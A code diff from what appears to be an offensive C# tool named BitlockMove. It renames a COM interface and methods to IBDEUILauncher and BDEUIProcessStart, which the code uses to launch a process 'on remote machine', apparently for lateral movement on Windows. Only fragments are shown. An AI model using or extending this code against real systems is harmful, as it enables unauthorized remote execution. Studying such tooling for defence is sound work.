@@ -142,15 +142,15 @@ namespace BitlockMove
         [ComImport]
         [TypeLibType(TypeLibTypeFlags.FDual | TypeLibTypeFlags.FNonExtensible | TypeLibTypeFlags.FDispatchable)]
         [Guid("8961F0A0-FF62-403B-91B4-7B9280241CEB")]
-        public interface IBitlockMoveLauncher
+        public interface IBDEUILauncher
         {
             [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime)]
             [DispId(1)]
-            int BitlockMoveProcessStart([In] int enumBitlockMoveApp, [In] int enumProcStartMode, [In][MarshalAs(UnmanagedType.BStr)] string bstrStartParam);
+            int BDEUIProcessStart([In] int enumBitlockMoveApp, [In] int enumProcStartMode, [In][MarshalAs(UnmanagedType.BStr)] string bstrStartParam);
 
             [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime)]
             [DispId(2)]
-            void BitlockMoveContextTrigger([In] int enumBdeSvcApi, [In][MarshalAs(UnmanagedType.BStr)] string bstrBdeSvcApiParam, [In] bool bSynchronous);
+            void BDEUIContextTrigger([In] int enumBdeSvcApi, [In][MarshalAs(UnmanagedType.BStr)] string bstrBdeSvcApiParam, [In] bool bSynchronous);
 
             [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime)]
             [DispId(3)]
@@ -402,11 +402,11 @@ namespace BitlockMove
                 }
 
 
-                IBitlockMoveLauncher server = (IBitlockMoveLauncher)Marshal.GetObjectForIUnknown(qis[0].pItf);
+                IBDEUILauncher server = (IBDEUILauncher)Marshal.GetObjectForIUnknown(qis[0].pItf);
 
                 Console.WriteLine("[*] Calling BitlockMoveProcessStart on remote machine...");
-                int result = server.BitlockMoveProcessStart(4, 0, path);
-                Console.WriteLine($"[*] BitlockMoveProcessStart returned: {result}");
+                int result = server.BDEUIProcessStart(4, 0, path);
+                Console.WriteLine($"[*] BDEUIProcessStart returned: {result}");
             }
             catch (Exception e)
             {
